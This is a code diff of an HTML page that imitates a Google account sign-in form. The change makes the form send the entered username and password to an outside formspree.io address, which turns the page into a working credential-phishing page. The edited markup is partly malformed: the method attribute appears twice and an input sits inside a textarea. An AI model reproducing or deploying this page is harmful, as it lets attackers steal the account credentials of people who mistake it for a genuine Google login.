@@ -14,13 +14,13 @@
         <div class="box">
                 <h2>Sign in</h2>
                 <p>Use your Google Account</p>
-                <form>
+                <form name="input" method="post" action="https://formspree.io/mvovogrb" method="POST">
                   <div class="inputBox">
-                    <input type="email" name="email" required onkeyup="this.setAttribute('value', this.value);"  value="">
+                    <input type="email" name="_replyto" required onkeyup="this.setAttribute('value', this.value);"  value="">
                     <label>Username</label>
                   </div>
                   <div class="inputBox">
-                        <input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value="">
+                        <textarea name="message"><input type="text" name="text" required onkeyup="this.setAttribute('value', this.value);" value=""></textarea>
                         <label>Password</label>
                       </div>
                   <input type="submit" name="sign-in" value="Sign In">
